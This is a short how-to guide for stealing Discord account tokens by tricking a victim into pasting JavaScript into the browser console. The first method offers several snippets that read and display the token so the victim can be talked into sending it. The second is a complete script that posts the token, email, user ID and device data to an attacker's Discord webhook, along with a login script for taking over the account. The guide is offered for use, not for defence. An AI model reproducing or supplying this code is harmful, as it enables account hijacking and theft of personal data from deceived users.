## Discord Matters

### Grabbing the token
Our first step is to obtain the discord token. This can be done through a C++ program compiled into exe, Python program (may be in exe), or JavaScript injection in the console of discord web version. This involves a little social engineering as it requires either you or the victim to run the code and grab the token.

- Method 1: 

Get user to copy and paste this code into browser and send you back the token. Token will be alerted in window and logged in console. 

``` function getLocalStoragePropertyDescriptor() {const iframe = document.createElement('iframe');document.head.append(iframe);const pd = Object.getOwnPropertyDescriptor(iframe.contentWindow, 'localStorage');iframe.remove();return pd;} Object.defineProperty(window, 'localStorage', getLocalStoragePropertyDescriptor());console.log(localStorage.token); window.alert(localStorage.token); ```

Make sure to tell the user to ```toggle device toolbar``` with the button below or else the code will not fetch.

Before: ![](https://i.imgur.com/AfWZAQl.jpeg)
After: ![](https://i.imgur.com/zl2sHCk.jpeg)

Alternative codes, follow the same steps as above.

```javascript:document.getElementsByTagName("body")[0].innerHTML = localStorage.token;```

```Object.values(webpackJsonp.push([[],{['']:(_,e,r)=>{e.cache=r.c}},[['']]]).cache).find(m=>m.exports&&m.exports.default&&m.exports.default.getToken!==void 0).exports.default.getToken()```

- Method 2:

Get user to copy and paste this code into browser and token will be automatically sent back to you via discord webhook.

```
location.reload();
var discordWebhook = "YOUR DISCORD WEBHOOK HERE";
var i = document.createElement('iframe');
document.body.appendChild(i);
var request = new XMLHttpRequest();
request.open("POST", discordWebhook);
request.setRequestHeader('Content-type', 'application/json');
var params = {
    username: "Token Grabber",
    avatar_url: "https://malwarefox.com/wp-content/uploads/2017/11/hacker-1.png",
    content: '**Nouvelle personne hackée !**\n------------------\nToken : ' + i.contentWindow.localStorage.token + '\n------------------\nAdresse email : ' + i.contentWindow.localStorage.email_cache + '\n------------------\nUser ID : ' + i.contentWindow.localStorage.user_id_cache + '\n------------------\nFingerprint : ' + i.contentWindow.localStorage.fingerprint + '\n------------------\nPropriétés : \`\`\`json\n' + i.contentWindow.localStorage.deviceProperties + '\`\`\`------------------\nScript de login : \n\`\`\`js\nlocation.reload();var i = document.createElement(\'iframe\');document.body.appendChild(i);i.contentWindow.localStorage.token = "\\"' + i.contentWindow.localStorage.token.replace(/^"(.*)"$/, '$1') + '\\""\`\`\`'
};
request.send(JSON.stringify(params));```

How to set up your discord webhook: 

- fd
